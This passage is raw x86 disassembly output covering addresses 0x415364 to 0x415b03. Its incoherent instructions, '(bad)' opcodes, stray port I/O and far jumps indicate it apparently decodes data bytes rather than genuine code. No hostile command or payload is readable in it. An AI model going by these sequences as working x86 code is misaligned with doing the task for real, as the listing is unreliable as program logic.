  415364:	jg     0x415391
  415366:	dec    ebx
  415367:	ins    BYTE PTR es:[edi],dx
  415368:	stc    
  415369:	adc    esi,DWORD PTR [eax+0x7c693a5c]
  41536f:	pop    ds
  415370:	lods   eax,DWORD PTR ds:[esi]
  415371:	cs xchg ebp,eax
  415373:	mov    esp,0x1b0e7347
  415378:	iret   
  415379:	mov    dl,0x76
  41537b:	ja     0x4153c2
  41537d:	and    eax,DWORD PTR [eax+0x65ad80e3]
  415383:	push   0xe6c3c5e3
  415388:	and    bl,dh
  41538a:	cmp    eax,0xda0c8c55
  41538f:	or     bl,BYTE PTR [ecx+edi*2]
  415392:	mov    ds:0x4f61e0be,eax
  415397:	fs loopne 0x4153e2
  41539a:	push   edx
  41539b:	sbb    ebp,DWORD PTR [eax-0x15]
  41539e:	call   0x8524bb95
  4153a3:	mov    ds:0x1f895,al
  4153a8:	out    0xab,eax
  4153aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ab:	mov    ecx,0xd07c3f4f
  4153b0:	jge    0x415424
  4153b2:	sar    DWORD PTR [ebp-0x2755d5e0],0xe2
  4153b9:	sbb    eax,0x8c9a2956
  4153be:	mov    gs,WORD PTR [ebx-0x22e3bbe]
  4153c4:	in     eax,dx
  4153c5:	or     dh,ch
  4153c7:	stos   BYTE PTR es:[edi],al
  4153c8:	aam    0x86
  4153ca:	sbb    BYTE PTR [esi+0x5f],al
  4153cd:	inc    esp
  4153ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153cf:	enter  0xe241,0x46
  4153d3:	dec    esp
  4153d4:	lods   eax,DWORD PTR ds:[esi]
  4153d5:	not    edx
  4153d7:	sub    BYTE PTR [edx],ah
  4153d9:	or     eax,0xf60c20a9
  4153de:	mov    DWORD PTR ds:0xcbda8c0f,eax
  4153e4:	pop    ds
  4153e5:	mov    esp,0x3d85a989
  4153ea:	jae    0x41538e
  4153ec:	in     eax,0xca
  4153ee:	ins    DWORD PTR es:[edi],dx
  4153ef:	aaa    
  4153f0:	pop    esi
  4153f1:	ins    BYTE PTR es:[edi],dx
  4153f2:	mov    ah,0xe1
  4153f4:	jmp    0x30c5:0x8d46c38c
  4153fb:	add    dh,BYTE PTR [esi]
  4153fd:	repz xor eax,0xcfe1d366
  415403:	and    BYTE PTR [edx],ch
  415405:	mov    edi,DWORD PTR [edx-0x78]
  415408:	mov    WORD PTR [edi],ss
  41540a:	(bad)  
  41540c:	scas   al,BYTE PTR es:[edi]
  41540d:	jbe    0x41545f
  41540f:	lea    ebp,[edi-0x1f]
  415412:	mov    cl,0xb1
  415414:	cmp    al,0xef
  415416:	add    BYTE PTR ds:0xb691d50e,dl
  41541c:	pop    ds
  41541d:	out    0x36,al
  41541f:	push   ss
  415420:	inc    ebx
  415421:	cmp    edx,DWORD PTR [ecx]
  415423:	ret    
  415424:	adc    al,BYTE PTR gs:[ecx+0x1a5613f2]
  41542b:	xchg   ecx,eax
  41542c:	xchg   esi,eax
  41542d:	mov    dl,0x51
  41542f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415430:	push   esi
  415431:	pop    es
  415432:	mov    bh,0xf7
  415434:	and    ch,BYTE PTR [ebp-0x71]
  415437:	lods   eax,DWORD PTR ds:[esi]
  415438:	jnp    0x41544f
  41543a:	in     al,0x4
  41543c:	inc    ebp
  41543d:	aas    
  41543e:	icebp  
  41543f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415440:	fs adc al,0x43
  415443:	pop    esp
  415444:	gs push ebp
  415446:	js     0x415471
  415448:	imul   ebx,esi,0xffffffe8
  41544b:	jmp    0xde01:0xecf9861e
  415452:	test   BYTE PTR [eax+edx*8],al
  415455:	dec    eax
  415456:	mov    bl,0x6e
  415458:	aaa    
  415459:	sbb    bh,BYTE PTR [eax]
  41545b:	stc    
  41545c:	stc    
  41545d:	adc    BYTE PTR [esi-0x38],ch
  415460:	fistp  DWORD PTR [ebx+0x3b5d64ff]
  415466:	ins    DWORD PTR es:[edi],dx
  415467:	xchg   edi,eax
  415468:	ja     0x41548d
  41546a:	ds jmp 0xf5f3d9ec
  415470:	fwait
  415471:	add    edi,DWORD PTR [ebx-0x4d]
  415474:	ds fs cmp al,0x58
  415478:	loopne 0x41549d
  41547a:	fwait
  41547b:	jl     0x4154fa
  41547d:	fisub  WORD PTR [ebp+0x2807e578]
  415483:	dec    edi
  415484:	sub    esi,DWORD PTR [ecx+esi*2]
  415487:	aam    0x65
  415489:	ficom  WORD PTR [ecx+edx*4]
  41548c:	xchg   BYTE PTR [edi-0x5d5b2100],bl
  415492:	ja     0x4154db
  415494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415495:	mov    al,gs:0xd680e124
  41549b:	cmp    eax,0x2757dbab
  4154a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154a1:	scas   al,BYTE PTR es:[edi]
  4154a2:	or     cl,BYTE PTR ds:0x84557290
  4154a8:	mov    bh,0xed
  4154aa:	stc    
  4154ab:	ss stos DWORD PTR es:[edi],eax
  4154ad:	push   ss
  4154ae:	int    0x81
  4154b0:	and    ebp,DWORD PTR [edx]
  4154b2:	pop    ecx
  4154b3:	xor    al,0x1a
  4154b5:	dec    edx
  4154b6:	dec    edx
  4154b7:	call   0x2dfb1d82
  4154bc:	mov    cl,0xfd
  4154be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154bf:	jb     0x41553a
  4154c1:	pop    eax
  4154c2:	les    esi,FWORD PTR [edx]
  4154c4:	sti    
  4154c5:	sub    eax,0x16dcd849
  4154ca:	popa   
  4154cb:	imul   eax,ecx,0x3eeae3e2
  4154d1:	mov    cl,0xcd
  4154d3:	out    0x19,eax
  4154d5:	sbb    BYTE PTR [edi-0x5d8a534],dh
  4154db:	jecxz  0x415488
  4154dd:	pop    ebx
  4154de:	fs out dx,al
  4154e0:	int3   
  4154e1:	cmp    bl,BYTE PTR [esi]
  4154e3:	mov    DWORD PTR ds:0x775f2b7a,esp
  4154e9:	sbb    DWORD PTR [ebx+0x11bf7ae4],esp
  4154ef:	pop    edx
  4154f0:	in     al,0xda
  4154f2:	push   ecx
  4154f3:	add    eax,0xe98f2fce
  4154f8:	cwde   
  4154f9:	xchg   ebx,eax
  4154fa:	cwde   
  4154fb:	imul   ebp,DWORD PTR [edx-0x40],0x7d
  4154ff:	xchg   esi,eax
  415500:	aam    0x5c
  415502:	sahf   
  415503:	add    eax,0xa4dff98c
  415508:	cmp    eax,ecx
  41550a:	test   al,0xad
  41550c:	sub    BYTE PTR [ecx+0x775bb9f6],bh
  415512:	jge    0x415518
  415514:	jmp    0x4154cb
  415516:	(bad)  
  415517:	in     eax,dx
  415518:	test   DWORD PTR [edx],ecx
  41551a:	mov    WORD PTR [ebp+0x2ce87f89],fs
  415520:	sbb    BYTE PTR [ecx-0x5dee4fdb],dl
  415526:	jmp    0x5744:0x829c4748
  41552d:	call   0x88a576a4
  415532:	test   al,0x78
  415534:	cmc    
  415535:	inc    ecx
  415536:	rcl    BYTE PTR [edi],1
  415538:	dec    ecx
  415539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41553a:	sar    DWORD PTR [ebx+edi*1+0x32],0x27
  41553f:	xor    BYTE PTR [eax-0x3e2d1109],0xa4
  415546:	cmp    al,0x35
  415548:	push   esi
  415549:	test   DWORD PTR [ebx+0x1b],ebp
  41554c:	mov    cl,0xd2
  41554e:	cld    
  41554f:	inc    eax
  415550:	test   BYTE PTR [eax+0x64],dl
  415553:	or     eax,0xb965b632
  415558:	inc    eax
  415559:	lds    ebx,FWORD PTR [ecx+0x7942fb88]
  41555f:	or     DWORD PTR [ebx+ebx*4+0x66],ebx
  415563:	retf   
  415564:	rcr    BYTE PTR [edx+0x76ae2eab],cl
  41556a:	(bad)  
  41556b:	rol    BYTE PTR [ebx-0x45],1
  41556e:	xor    eax,0x17b65fca
  415573:	hlt    
  415574:	sar    BYTE PTR [eax-0x53618683],1
  41557a:	ins    BYTE PTR es:[edi],dx
  41557b:	add    al,0x82
  41557d:	es lahf 
  41557f:	adc    esp,esp
  415581:	mov    eax,0xe971ace3
  415586:	sub    al,0xf5
  415588:	and    BYTE PTR [ecx-0x39a9f4d],cl
  41558e:	enter  0xca44,0xf6
  415592:	pop    esi
  415593:	xor    DWORD PTR ds:0x4e49e27d,0x2a
  41559a:	mov    ah,0xb1
  41559c:	push   ss
  41559d:	mov    ah,0x81
  41559f:	lock push cs
  4155a1:	or     ebp,eax
  4155a3:	sub    bl,cl
  4155a5:	int3   
  4155a6:	addr16 cmp eax,0xaeb77f61
  4155ac:	push   ebx
  4155ad:	(bad)  
  4155ae:	or     al,0xcc
  4155b0:	fldcw  WORD PTR [esi]
  4155b2:	pop    edi
  4155b3:	cmp    eax,edx
  4155b5:	adc    edx,ebx
  4155b7:	js     0x4155c6
  4155b9:	out    dx,eax
  4155ba:	jno    0x415604
  4155bc:	pop    ebp
  4155bd:	aaa    
  4155be:	pushf  
  4155bf:	mov    ebx,0x4697bb02
  4155c4:	add    esi,esp
  4155c6:	in     eax,dx
  4155c7:	retf   
  4155c8:	pop    ebp
  4155c9:	(bad)  
  4155ca:	cli    
  4155cb:	fst    DWORD PTR ds:0x6a08043a
  4155d1:	imul   esp,edx,0x6762b355
  4155d7:	sar    BYTE PTR [esi-0x1878000],1
  4155dd:	sub    eax,0x8c05a8c2
  4155e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e3:	ins    BYTE PTR es:[edi],dx
  4155e4:	add    DWORD PTR [edx+0x18],esp
  4155e7:	xchg   ecx,eax
  4155e8:	clc    
  4155e9:	add    ebp,DWORD PTR [esi]
  4155eb:	inc    esi
  4155ec:	inc    edx
  4155ed:	sbb    DWORD PTR [ebx+0x15a900b6],0xffffffeb
  4155f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155f5:	jbe    0x4155f4
  4155f7:	push   es
  4155f8:	sbb    esp,eax
  4155fa:	and    al,0x83
  4155fc:	or     BYTE PTR [ebx+0x5d],ah
  4155ff:	cwde   
  415600:	lds    ecx,FWORD PTR [esi]
  415602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415603:	cld    
  415604:	ins    DWORD PTR es:[edi],dx
  415605:	or     DWORD PTR [edi*2-0x6573d399],esi
  41560c:	inc    ecx
  41560d:	ret    
  41560e:	imul   esp,DWORD PTR ds:0x2e5e96b2,0x35
  415615:	sub    ch,BYTE PTR [eax-0x78efd78e]
  41561b:	dec    esi
  41561c:	repz mov eax,0xbd23fb2
  415622:	loope  0x415655
  415624:	dec    ebp
  415625:	inc    esp
  415626:	cli    
  415627:	int3   
  415628:	call   0x6436:0x1296e08
  41562f:	retf   
  415630:	mov    esp,0x33d7d0f1
  415635:	jae    0x415699
  415637:	push   ds
  415638:	test   DWORD PTR [edi],esp
  41563a:	arpl   WORD PTR [eax-0xa],bx
  41563d:	add    DWORD PTR [ebp+0x7],0x62e7abef
  415644:	sub    al,0xe2
  415646:	sbb    bl,BYTE PTR [edx+0x18]
  415649:	ins    DWORD PTR es:[edi],dx
  41564a:	xchg   ebx,eax
  41564b:	rcr    DWORD PTR [edi+edi*8],1
  41564e:	cmp    esi,ecx
  415650:	inc    edx
  415651:	jmp    0x1409:0x365921f9
  415658:	ret    0xe3e
  41565b:	inc    esi
  41565c:	jbe    0x415638
  41565e:	lds    esi,FWORD PTR [esi+0x4f]
  415661:	mov    ds:0x4815d0f9,al
  415666:	adc    ecx,DWORD PTR [edx]
  415668:	js     0x415675
  41566a:	jne    0x4156ca
  41566c:	cmp    ch,BYTE PTR [esi-0x4b]
  41566f:	fisubr WORD PTR [ebx-0x18]
  415672:	sbb    al,0xbc
  415674:	fidivr WORD PTR [ebx]
  415676:	retf   
  415677:	pop    ebp
  415678:	cdq    
  415679:	xor    BYTE PTR [ebp+0x5c],0x9d
  41567d:	mov    bh,0x41
  41567f:	fs clc 
  415681:	add    cl,BYTE PTR [esi]
  415683:	mov    cl,0x4b
  415685:	es mov esi,0x8048d054
  41568b:	push   0xae46568c
  415690:	cmc    
  415691:	popf   
  415692:	adc    ah,BYTE PTR [ebx+0x6c]
  415695:	cmp    ah,al
  415697:	mov    ebx,0x7c03a6e9
  41569c:	(bad)  
  41569d:	xor    al,0x80
  41569f:	xchg   DWORD PTR ds:0x52476d92,eax
  4156a5:	ret    
  4156a6:	sbb    eax,ecx
  4156a8:	sti    
  4156a9:	mov    al,ds:0x86cae6e6
  4156ae:	add    BYTE PTR [ebp-0x5c946541],0x23
  4156b5:	cwde   
  4156b6:	fwait
  4156b7:	push   ecx
  4156b8:	push   eax
  4156b9:	les    edi,FWORD PTR [esi+eiz*8+0x1e]
  4156bd:	loopne 0x41565f
  4156bf:	jg     0x415677
  4156c1:	adc    eax,0x4c990e56
  4156c6:	mov    ah,BYTE PTR [edi+0x4f]
  4156c9:	(bad)  
  4156ca:	cld    
  4156cb:	lods   al,BYTE PTR ds:[esi]
  4156cc:	test   al,0x33
  4156ce:	dec    ebp
  4156cf:	stc    
  4156d0:	cmp    esi,DWORD PTR [eax]
  4156d2:	(bad)  
  4156d3:	out    dx,al
  4156d4:	mov    edi,0x38523c62
  4156d9:	mov    ebx,0xf6c617a3
  4156de:	(bad)  
  4156df:	mov    esi,0x176da90d
  4156e4:	cmp    ebp,DWORD PTR [edx+0x4e74194c]
  4156ea:	sahf   
  4156eb:	lock gs mov edx,0xab0c8e40
  4156f2:	int3   
  4156f3:	fdivr  DWORD PTR [ebx-0x5e]
  4156f6:	lock pop esi
  4156f8:	or     al,0xc5
  4156fa:	mov    ecx,0x824c923b
  4156ff:	mov    bh,0xce
  415701:	push   ebx
  415702:	stos   BYTE PTR es:[edi],al
  415703:	test   BYTE PTR [ebx+0x60],ah
  415706:	fdivr  DWORD PTR [eax+0x543bbfd2]
  41570c:	mov    BYTE PTR [eax],al
  41570e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41570f:	push   eax
  415710:	lahf   
  415711:	xor    al,0x68
  415713:	std    
  415714:	sub    ebp,esi
  415716:	std    
  415717:	and    esp,edi
  415719:	into   
  41571a:	loopne 0x415781
  41571c:	and    edi,DWORD PTR [esi+edx*4-0x430dd4a4]
  415723:	mov    ds:0xaff6238,eax
  415728:	enter  0x85be,0x3
  41572c:	dec    eax
  41572d:	push   es
  41572e:	cmp    BYTE PTR [eax],cl
  415730:	dec    ebx
  415731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415732:	out    0x11,al
  415734:	inc    ebx
  415735:	push   esp
  415736:	and    al,0x1b
  415738:	sbb    ah,dh
  41573a:	push   0x2584158e
  41573f:	push   ebp
  415740:	cli    
  415741:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  415743:	outs   dx,DWORD PTR ds:[esi]
  415744:	pop    edi
  415745:	stos   DWORD PTR es:[edi],eax
  415746:	adc    al,0xa0
  415748:	cmp    eax,0xf0d567af
  41574d:	hlt    
  41574e:	adc    eax,0xebed8ff8
  415753:	sahf   
  415754:	sahf   
  415755:	outs   dx,DWORD PTR ds:[esi]
  415756:	lfs    ecx,FWORD PTR [ebx+ebp*1-0x1c]
  41575b:	aaa    
  41575c:	jmp    0xc76f:0x913a1fcd
  415763:	in     al,dx
  415764:	in     al,dx
  415765:	in     al,dx
  415766:	rcr    BYTE PTR [eax],cl
  415768:	ins    BYTE PTR es:[edi],dx
  415769:	or     al,0xd6
  41576b:	sub    al,0xe8
  41576d:	rol    BYTE PTR [ecx+eiz*2+0x51],1
  415771:	into   
  415772:	scas   al,BYTE PTR es:[edi]
  415773:	dec    esi
  415774:	sbb    dl,BYTE PTR [edx+edi*8+0x47]
  415778:	and    DWORD PTR [eax+0x3dbc425d],eax
  41577e:	cmp    ah,0x61
  415781:	add    BYTE PTR [ecx-0x32],ah
  415784:	iret   
  415785:	stos   DWORD PTR es:[edi],eax
  415786:	xchg   ebp,eax
  415787:	outs   dx,DWORD PTR ds:[esi]
  415788:	enter  0x6f,0x39
  41578c:	daa    
  41578d:	push   esp
  41578e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41578f:	test   cl,dh
  415791:	push   ebp
  415792:	(bad)  
  415793:	test   al,0x58
  415795:	add    BYTE PTR [esi],ah
  415797:	push   ebx
  415798:	adc    BYTE PTR ds:0x93a32259,bl
  41579e:	cdq    
  41579f:	mov    ch,0x71
  4157a1:	push   cs
  4157a2:	adc    ecx,edx
  4157a4:	int3   
  4157a5:	in     eax,dx
  4157a6:	daa    
  4157a7:	and    DWORD PTR [ecx],eax
  4157a9:	icebp  
  4157aa:	push   esi
  4157ab:	and    DWORD PTR [eax+ebx*4],0xc84247fc
  4157b2:	xchg   ecx,eax
  4157b3:	cmp    bl,BYTE PTR [edx+0x72]
  4157b6:	out    0x34,eax
  4157b8:	mov    WORD PTR [ebx],?
  4157ba:	push   ebx
  4157bb:	add    al,0x1f
  4157bd:	stc    
  4157be:	push   esp
  4157bf:	dec    edx
  4157c0:	and    DWORD PTR [edi],0x3b
  4157c3:	ret    
  4157c4:	fld    st(7)
  4157c6:	dec    esi
  4157c7:	nop
  4157c8:	and    edx,DWORD PTR [ecx-0x7a]
  4157cb:	fild   DWORD PTR ds:0x5bec97d4
  4157d1:	push   eax
  4157d2:	out    0xdd,eax
  4157d4:	sbb    eax,DWORD PTR [edi]
  4157d6:	jns    0x41579c
  4157d8:	xor    eax,0x80e41d1b
  4157dd:	mov    ?,WORD PTR ss:0x8f5494ef
  4157e4:	inc    esi
  4157e5:	adc    DWORD PTR [ecx+0x71d139ad],0x7
  4157ec:	rcl    esp,1
  4157ee:	add    esp,DWORD PTR [ebx]
  4157f0:	dec    ebx
  4157f1:	scas   al,BYTE PTR es:[edi]
  4157f2:	xchg   ecx,eax
  4157f3:	aam    0x2e
  4157f5:	sti    
  4157f6:	gs xchg ebx,eax
  4157f8:	fdivp  st(0),st
  4157fa:	jl     0x41585d
  4157fc:	repnz mov esi,0x5dc29e07
  415802:	mov    esp,0x58f13fd4
  415807:	in     al,dx
  415808:	fsubr  QWORD PTR [edx]
  41580a:	cmp    dl,BYTE PTR [edx]
  41580c:	je     0x415825
  41580e:	adc    al,BYTE PTR [eax+eiz*1+0x62]
  415812:	cmp    BYTE PTR [edx],0x7c
  415815:	(bad)  
  415816:	in     eax,dx
  415817:	mov    dl,0x67
  415819:	je     0x41584f
  41581b:	fimul  DWORD PTR [esp+edx*4-0x41]
  41581f:	push   edx
  415820:	cmp    BYTE PTR [ebp-0x73],0xd6
  415824:	push   ss
  415825:	lea    edx,[ecx+0x16]
  415828:	hlt    
  415829:	and    DWORD PTR [edx-0x1c],0xffffffab
  41582d:	ror    DWORD PTR [eax+0x41],0xb5
  415831:	or     ebx,edi
  415833:	sbb    al,0x6
  415835:	fcomp  st(3)
  415837:	adc    ebp,0xffffffe0
  41583a:	daa    
  41583b:	and    eax,0xb8957c72
  415840:	or     ah,dl
  415842:	add    esp,DWORD PTR [esi]
  415844:	mov    eax,esp
  415846:	or     dh,BYTE PTR [esi-0x614fe05d]
  41584c:	xor    DWORD PTR [ebp-0x2d3e608b],0xa674daf5
  415856:	das    
  415857:	(bad)  
  415858:	aad    0x5f
  41585a:	cwde   
  41585b:	cmp    bh,bl
  41585d:	imul   esi,DWORD PTR [edi+0x549a6339]
  415864:	sbb    esp,DWORD PTR [edx+0x776db669]
  41586a:	(bad)  
  41586b:	xchg   esi,eax
  41586c:	mov    eax,0x68ccec53
  415871:	mov    ecx,0xbca58113
  415876:	mov    edi,0xb963ccad
  41587b:	pop    ecx
  41587c:	sahf   
  41587d:	ds cmp cx,ax
  415881:	mov    ds:0x2069bbfb,al
  415886:	sbb    al,dl
  415888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41588a:	mov    ah,BYTE PTR [edx]
  41588c:	fild   QWORD PTR [ebx]
  41588e:	fadd   DWORD PTR [ecx+0x2adda6d4]
  415894:	fisttp QWORD PTR [ebx+ecx*8+0x16f1b85b]
  41589b:	inc    ebp
  41589c:	(bad)  
  41589d:	cwde   
  41589e:	clc    
  41589f:	fidiv  WORD PTR [ebx-0x35]
  4158a2:	mov    ebx,edx
  4158a4:	mov    BYTE PTR [ebp+0x32],al
  4158a7:	enter  0x970,0x5b
  4158ab:	mov    ebx,0xcd9771dd
  4158b0:	stos   DWORD PTR es:[edi],eax
  4158b1:	es popf 
  4158b3:	cli    
  4158b4:	test   eax,0x50c93411
  4158b9:	daa    
  4158ba:	dec    esp
  4158bb:	cmp    DWORD PTR [edx],esp
  4158bd:	cli    
  4158be:	dec    ebx
  4158bf:	clc    
  4158c0:	es nop
  4158c2:	pop    eax
  4158c3:	arpl   WORD PTR [edi-0x53],cx
  4158c6:	or     DWORD PTR [edx],edi
  4158c8:	xchg   edx,eax
  4158c9:	mov    ch,0xa2
  4158cb:	int3   
  4158cc:	mov    BYTE PTR [ebp+0x3e6d40d],bl
  4158d2:	loop   0x415876
  4158d4:	popa   
  4158d5:	lods   eax,DWORD PTR ds:[esi]
  4158d6:	cwde   
  4158d7:	js     0x41586c
  4158d9:	jp     0x415902
  4158db:	jp     0x41590d
  4158dd:	inc    edi
  4158de:	loopne 0x415883
  4158e0:	pop    ebx
  4158e1:	hlt    
  4158e2:	push   0x23
  4158e4:	pop    esp
  4158e5:	xchg   esi,eax
  4158e6:	mov    ecx,DWORD PTR [eax+0x67]
  4158e9:	jns    0x415968
  4158eb:	mov    cl,0x52
  4158ed:	test   BYTE PTR [edx-0x35],0xa8
  4158f1:	fsub   DWORD PTR [ecx-0x42]
  4158f4:	out    dx,eax
  4158f5:	shl    ah,0x37
  4158f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158f9:	mov    dh,0xa8
  4158fb:	jno    0x415927
  4158fd:	xor    eax,0xa8afe136
  415902:	dec    ecx
  415903:	aam    0x76
  415905:	pop    eax
  415906:	out    0x91,al
  415908:	mov    edi,0x59f952cc
  41590d:	and    dl,BYTE PTR [ebp-0x636a9cd0]
  415913:	imul   esi,DWORD PTR [eax+eax*4],0x1f
  415917:	addr16 mov dx,0x54e
  41591c:	test   edi,ebp
  41591e:	mov    edx,0x58d35e44
  415923:	jp     0x415989
  415925:	pop    ds
  415926:	mov    eax,0x531f1128
  41592b:	mov    edi,0x8cde8261
  415930:	lahf   
  415931:	test   DWORD PTR [esi],ecx
  415933:	mov    ebp,0x555116d1
  415938:	(bad)  
  415939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41593a:	xchg   ebx,eax
  41593b:	push   ebp
  41593c:	jnp    0x415963
  41593e:	xor    DWORD PTR [edx-0x5dedd685],edx
  415944:	jmp    0x88f4:0xbab64e3c
  41594b:	push   esp
  41594c:	jae    0x415957
  41594e:	fnstcw WORD PTR [ecx-0x57]
  415951:	sbb    DWORD PTR [ecx],0x7e
  415954:	jnp    0x415936
  415956:	xor    edx,edi
  415958:	mov    dl,0x6e
  41595a:	leave  
  41595b:	sub    al,0x3f
  41595d:	adc    eax,0xe7d3b79f
  415962:	inc    ebx
  415963:	inc    esp
  415964:	xchg   edx,eax
  415965:	rol    BYTE PTR ds:0x6e0d2593,0x76
  41596c:	pop    ebx
  41596d:	push   0x12
  41596f:	or     ebp,DWORD PTR [ebx+eax*4+0x6079d9f1]
  415976:	lds    ebp,FWORD PTR [ebp+0x128c73b7]
  41597c:	adc    bl,ch
  41597e:	push   es
  41597f:	inc    ebp
  415980:	or     cl,BYTE PTR [ecx-0x61]
  415983:	mov    dh,0xc
  415985:	mov    ebp,0x36af2d63
  41598a:	nop
  41598b:	enter  0xddb1,0xcf
  41598f:	jne    0x4159c1
  415991:	xor    ah,BYTE PTR [edx+0x52]
  415994:	xchg   DWORD PTR [ebx],edx
  415996:	mov    esi,0x1a58cc90
  41599b:	cmp    esi,DWORD PTR [edx-0x1d]
  41599e:	xor    DWORD PTR [edx-0x77],ecx
  4159a1:	outs   dx,BYTE PTR ds:[esi]
  4159a2:	xor    al,0xcb
  4159a4:	sbb    BYTE PTR [ecx-0x80],cl
  4159a7:	and    esi,DWORD PTR [ebx-0x70]
  4159aa:	dec    edx
  4159ab:	sti    
  4159ac:	jae    0x415a1c
  4159ae:	imul   esp,DWORD PTR [esi],0x7aeb0c3b
  4159b4:	iret   
  4159b5:	fs pop ss
  4159b7:	push   0x96589f64
  4159bc:	sub    edi,DWORD PTR [ebp+0x1b]
  4159bf:	add    eax,0xefad9c88
  4159c4:	out    0x1b,al
  4159c6:	adc    BYTE PTR [esp+eax*2],al
  4159c9:	lds    ebp,FWORD PTR [eax+0x78]
  4159cc:	mov    eax,ds:0x2692986a
  4159d1:	ins    BYTE PTR es:[edi],dx
  4159d2:	pushf  
  4159d3:	mov    eax,DWORD PTR [eax+0x1c4689cc]
  4159d9:	bound  edx,QWORD PTR [esi]
  4159db:	lods   eax,DWORD PTR ds:[esi]
  4159dc:	clc    
  4159dd:	out    dx,eax
  4159de:	pop    esp
  4159df:	pusha  
  4159e0:	leave  
  4159e1:	rol    DWORD PTR [eax-0x2c],cl
  4159e4:	mov    BYTE PTR [ecx+0x31f797a6],ah
  4159ea:	dec    ebp
  4159eb:	imul   edx,DWORD PTR [edx-0x76],0xfffffff6
  4159ef:	outs   dx,DWORD PTR ds:[esi]
  4159f0:	rol    dl,1
  4159f2:	or     BYTE PTR [esi-0x59ea42f1],al
  4159f8:	fdivr  DWORD PTR [esp+esi*8-0xac8d60]
  4159ff:	pop    ss
  415a00:	mov    cl,0x15
  415a02:	jp     0x4159d5
  415a04:	ss and eax,0x6a9b6ed4
  415a0a:	es dec esp
  415a0c:	fsubrp st(5),st
  415a0e:	(bad)  [ebp+0x4a63388d]
  415a14:	scas   eax,DWORD PTR es:[edi]
  415a15:	(bad)  
  415a17:	sub    al,0x39
  415a19:	push   edx
  415a1a:	(bad)
  415a1e:	pop    edx
  415a1f:	xor    BYTE PTR [ebx-0x16],dl
  415a22:	xchg   esp,eax
  415a23:	sbb    DWORD PTR [esi-0x6b43726],0x1b
  415a2a:	push   ebx
  415a2b:	hlt    
  415a2c:	mov    WORD PTR [edi+0x21961613],?
  415a32:	sbb    dl,cl
  415a34:	or     edi,esi
  415a36:	sub    BYTE PTR [ebx+0x4d],dh
  415a39:	sub    al,0xb9
  415a3b:	shr    BYTE PTR [edi+0x1e],1
  415a3e:	jmp    0x4255cccd
  415a43:	(bad)  
  415a44:	mov    dh,0x58
  415a46:	pop    ds
  415a47:	sbb    dh,BYTE PTR ds:0x538c7328
  415a4d:	mov    al,0x91
  415a4f:	lods   al,BYTE PTR ds:[esi]
  415a50:	and    eax,0xeca20411
  415a55:	add    BYTE PTR ds:[esi],dh
  415a58:	jno    0x415a20
  415a5a:	pusha  
  415a5b:	fsubr  st(1),st
  415a5d:	not    eax
  415a5f:	inc    ebx
  415a60:	ds adc cl,dl
  415a63:	outs   dx,DWORD PTR ds:[esi]
  415a64:	outs   dx,DWORD PTR ds:[esi]
  415a65:	test   BYTE PTR [edx],cl
  415a67:	sti    
  415a68:	lods   al,BYTE PTR ds:[esi]
  415a69:	loop   0x415a2b
  415a6b:	sbb    BYTE PTR [eax],bh
  415a6d:	push   ecx
  415a6e:	sub    ah,BYTE PTR [esi-0x543367b4]
  415a74:	jle    0x415a36
  415a76:	inc    ecx
  415a77:	in     al,dx
  415a78:	les    ebp,FWORD PTR [ebp-0x216ea965]
  415a7e:	int3   
  415a7f:	test   ah,0x73
  415a82:	lahf   
  415a83:	xchg   BYTE PTR fs:[edi-0x59a9136a],al
  415a8a:	shl    DWORD PTR [ecx+ebx*8-0x1b],0x72
  415a8f:	sub    al,0x6a
  415a91:	mov    ch,0x24
  415a93:	leave  
  415a94:	sbb    BYTE PTR [eax+0x2a],bh
  415a97:	xor    BYTE PTR [eax-0x55937d56],0x7d
  415a9e:	xchg   DWORD PTR [edi+0x354ec70e],esp
  415aa4:	iret   
  415aa5:	in     al,dx
  415aa6:	xor    eax,0xca6210e8
  415aab:	push   eax
  415aac:	arpl   WORD PTR [esi+eiz*8-0x7cac9f1d],ax
  415ab3:	xor    DWORD PTR [edx+edi*2-0x77],0x45
  415ab8:	dec    ebp
  415ab9:	test   al,0x79
  415abb:	push   0xa3f94324
  415ac0:	pop    ebp
  415ac1:	adc    dl,al
  415ac3:	jmp    DWORD PTR [edi+0x19]
  415ac6:	mov    edx,0xa189c555
  415acb:	push   ss
  415acc:	ins    DWORD PTR es:[edi],dx
  415acd:	pop    esp
  415ace:	mov    cl,0xb5
  415ad0:	(bad)  
  415ad1:	repnz xor eax,DWORD PTR [edx]
  415ad4:	hlt    
  415ad5:	mov    dl,0x5d
  415ad7:	test   eax,0x3b55977
  415adc:	xchg   edi,eax
  415add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ade:	bound  edi,QWORD PTR [ebx]
  415ae0:	jno    0x415ad9
  415ae2:	mov    ah,0x2a
  415ae4:	add    bl,BYTE PTR [eax-0xa]
  415ae7:	stos   DWORD PTR es:[di],eax
  415ae9:	jo     0x415aa0
  415aeb:	jecxz  0x415b66
  415aed:	cmp    eax,edx
  415aef:	sbb    DWORD PTR [ebx],0xffffff95
  415af2:	xchg   edx,eax
  415af3:	sub    eax,0xb9dbff88
  415af8:	jne    0x415a8a
  415afa:	sbb    esi,DWORD PTR [edx]
  415afc:	mov    ch,0x8
  415afe:	lods   eax,DWORD PTR ds:[esi]
  415aff:	retf   
  415b00:	test   dl,ah
  415b02:	(bad)  
  415b03:	imul   esp,DWORD PTR [edx+0x7e],0xffffffd6
